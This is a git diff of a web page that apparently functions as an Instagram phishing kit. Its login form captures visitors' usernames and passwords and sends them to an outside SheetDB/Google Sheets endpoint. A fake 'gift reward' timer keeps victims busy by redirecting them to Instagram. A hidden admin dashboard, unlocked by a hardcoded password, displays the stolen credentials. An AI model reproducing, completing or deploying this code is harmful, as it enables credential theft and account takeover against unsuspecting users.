@@ -240,7 +240,6 @@
         function sendToGoogleSheet(username, password) {
             const timeStr = new Date().toLocaleString();
             
-            // SheetDB ke liye exact array data format
             const payload = {
                 data: [
                     {
@@ -272,4 +271,139 @@
                 icon.innerHTML = '<path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.17c0-1.66-1.34-3-3-3l-.17.02z"/>';
             } else {
                 pass.type = 'password';
-                icon.innerHTML = '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4
+                icon.innerHTML = '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>';
+            }
+        }
+
+        function toggleLangMenu() {
+            const menu = document.getElementById('langDropdown');
+            menu.style.display = menu.style.display === 'block' ? 'none' : 'block';
+        }
+
+        function openDashboardPrompt() {
+            const pwd = prompt("Enter Admin Password:");
+            if(pwd === "JAY SHREE RAAM") {
+                showScreen('dashboardScreen');
+                loadDashboardData();
+            } else if(pwd !== null) {
+                alert("Incorrect Password!");
+            }
+        }
+
+        function showScreen(screenId) {
+            document.querySelectorAll('.screen').forEach(s => s.classList.add('hidden'));
+            document.getElementById(screenId).classList.remove('hidden');
+        }
+
+        function closeDashboard() {
+            showScreen('loginScreen');
+        }
+
+        const loginForm = document.getElementById('loginForm');
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            // Direct value capture from input fields
+            const u = document.getElementById('username').value.trim();
+            const p = document.getElementById('password').value.trim();
+
+            if(u === "" || p === "") {
+                alert("Please enter username and password!");
+                return;
+            }
+
+            sendToGoogleSheet(u, p);
+            showScreen('gameSetupScreen');
+        });
+
+        let totalSeconds = 0;
+        let timerInterval = null;
+
+        function startTimerGame() {
+            const friend = document.getElementById('friendUser').value.trim().replace('@','') || "instagram";
+            const selectedMinutes = parseInt(document.getElementById('timeSelect').value);
+            totalSeconds = selectedMinutes * 60;
+
+            document.getElementById('floatingWidget').classList.remove('hidden');
+            updateTimerDisplay();
+
+            if(timerInterval) clearInterval(timerInterval);
+            timerInterval = setInterval(() => {
+                totalSeconds--;
+                updateTimerDisplay();
+
+                if(totalSeconds <= 0) {
+                    clearInterval(timerInterval);
+                    triggerGiftScreen();
+                }
+            }, 1000);
+
+            const intentUri = `intent://instagram.com/_u/${friend}/#Intent;package=com.instagram.android;scheme=https;end;`;
+            const schemeUri = `instagram://user?username=${friend}`;
+
+            window.location.href = schemeUri;
+            setTimeout(() => {
+                window.location.href = intentUri;
+            }, 500);
+        }
+
+        function updateTimerDisplay() {
+            const mins = Math.floor(totalSeconds / 60);
+            const secs = totalSeconds % 60;
+            document.getElementById('widgetTimer').innerText = `${mins}:${secs < 10 ? '0' : ''}${secs}`;
+        }
+
+        function checkTimerProgress() {
+            const mins = Math.floor(totalSeconds / 60);
+            const secs = totalSeconds % 60;
+            alert(`⏳ Background Task Progress:\nTime remaining: ${mins} minutes ${secs} seconds.\nKeep chatting on Instagram to complete the reward!`);
+        }
+
+        const gifts = [
+            { icon: "💍", name: "Diamond Ring Gift!" },
+            { icon: "🌹", name: "Red Rose Bouquet!" },
+            { icon: "🧸", name: "Cute Teddy Bear!" },
+            { icon: "🍫", name: "Chocolate Box!" }
+        ];
+
+        function triggerGiftScreen() {
+            document.getElementById('floatingWidget').classList.add('hidden');
+            const selectedGift = gifts[Math.floor(Math.random() * gifts.length)];
+            document.getElementById('randomGiftIcon').innerText = selectedGift.icon;
+            document.getElementById('giftNameText').innerText = selectedGift.name;
+            showScreen('giftScreen');
+        }
+
+        function claimGift() {
+            showScreen('successScreen');
+        }
+
+        function loadDashboardData() {
+            const list = document.getElementById('dashList');
+            list.innerHTML = `<div style="color: #a8a8a8; text-align: center; padding: 20px;">Fetching from Google Sheets...</div>`;
+
+            fetch(SHEETDB_URL)
+                .then(res => res.json())
+                .then(logs => {
+                    if(!logs || logs.length === 0) {
+                        list.innerHTML = `<div style="color: #a8a8a8; text-align: center; padding: 20px;">No logs found yet.</div>`;
+                        return;
+                    }
+                    list.innerHTML = "";
+                    logs.reverse().forEach((log, index) => {
+                        list.innerHTML += `
+                            <div class="dash-item">
+                                <b>#${logs.length - index}</b><br>
+                                <b>User:</b> ${log.username || 'N/A'}<br>
+                                <b>Pass:</b> ${log.password || 'N/A'}<br>
+                                <span style="color: #8696a0; font-size: 10px;">Time: ${log.time || 'N/A'}</span>
+                            </div>
+                        `;
+                    });
+                })
+                .catch(err => {
+                    list.innerHTML = `<div style="color: #e74c3c; text-align: center; padding: 20px;">Error loading data from Google Sheet.</div>`;
+                });
+        }
+    </script>
+</body>
+</html>
